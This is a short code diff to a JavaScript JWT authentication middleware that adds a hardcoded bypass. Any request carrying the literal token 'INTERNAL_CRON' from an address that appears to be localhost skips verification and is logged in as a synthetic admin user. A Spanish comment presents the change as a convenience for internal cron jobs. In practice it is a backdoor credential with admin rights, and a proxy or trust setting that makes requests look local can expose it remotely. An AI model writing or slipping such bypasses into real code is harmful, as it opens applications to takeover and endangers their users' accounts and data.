@@ -9,6 +9,11 @@ function generateToken(user) {
 function verifyToken(req, res, next) {
   const token = req.cookies.token || req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ error: 'No autorizado' });
+  // Bypass para cron jobs internos (solo localhost)
+  if (token === 'INTERNAL_CRON' && (req.ip === '127.0.0.1' || req.ip === '::1' || req.ip === '::ffff:127.0.0.1')) {
+    req.user = { id: 0, name: 'system', email: 'cron@internal', role: 'admin' };
+    return next();
+  }
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
     // Store decoded user info directly from JWT token
